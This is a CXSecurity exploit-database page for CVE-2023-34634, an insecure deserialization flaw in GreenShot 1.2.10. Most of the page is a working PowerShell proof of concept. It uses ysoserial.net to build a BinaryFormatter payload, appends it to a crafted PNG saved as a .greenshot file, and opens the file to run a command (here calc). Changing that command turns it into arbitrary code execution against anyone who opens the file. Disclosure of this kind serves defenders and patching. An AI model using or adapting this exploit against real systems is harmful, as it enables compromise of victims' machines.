---
title: GreenShot 1.2.10 Arbitrary Code Execution
url: https://cxsecurity.com/issue/WLB-2023070084
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-08-01
fetch_date: 2025-10-06T16:58:44.051297
---

# GreenShot 1.2.10 Arbitrary Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **GreenShot 1.2.10 Arbitrary Code Execution** **2023.07.31**  Credit:  **[p4r4bellum](https://cxsecurity.com/author/p4r4bellum/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-34634](https://cxsecurity.com/cveshow/CVE-2023-34634/ "Click to see CVE-2023-34634")**  CWE: **N/A** | |

# Exploit Title: GreenShot 1.2.10 - Insecure Deserialization Arbitrary Code Execution
# Date: 26/07/2023
# Exploit Author: p4r4bellum
# Vendor Homepage: https://getgreenshot.org
# Software Link: https://getgreenshot.org/downloads/
# Version: 1.2.6.10
# Tested on: windows 10.0.19045 N/A build 19045
# CVE : CVE-2023-34634
#
# GreenShot 1.2.10 and below is vulnerable to an insecure object deserialization in its custom \*.greenshot format
# A stream of .Net object is serialized and inscureley deserialized when a \*.greenshot file is open with the software
# On a default install the \*.greenshot file extension is associated with the programm, so double-click on a\*.greenshot file
# will lead to arbitrary code execution
#
# Generate the payload. You need yserial.net to be installed on your machine. Grab it at https://github.com/pwntester/ysoserial.net
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc" --outputpath payload.bin -o raw
#load the payload
$payload = Get-Content .\payload.bin -Encoding Byte
# retrieve the length of the payload
$length = $payload.Length
# load the required assembly to craft a PNG file
Add-Type -AssemblyName System.Drawing
# the following lines creates a png file with some text. Code borrowed from https://stackoverflow.com/questions/2067920/can-i-draw-create-an-image-with-a-given-text-with-powershell
$filename = "$home\poc.greenshot"
$bmp = new-object System.Drawing.Bitmap 250,61
$font = new-object System.Drawing.Font Consolas,24
$brushBg = [System.Drawing.Brushes]::Green
$brushFg = [System.Drawing.Brushes]::Black
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
$graphics.DrawString('POC Greenshot',$font,$brushFg,10,10)
$graphics.Dispose()
$bmp.Save($filename)
# append the payload to the PNG file
$payload | Add-Content -Path $filename -Encoding Byte -NoNewline
# append the length of the payload
[System.BitConverter]::GetBytes([long]$length) | Add-Content -Path $filename -Encoding Byte -NoNewline
# append the signature
"Greenshot01.02" | Add-Content -path $filename -NoNewline -Encoding Ascii
# launch greenshot. Calc.exe should be executed
Invoke-Item $filename

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023070084)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top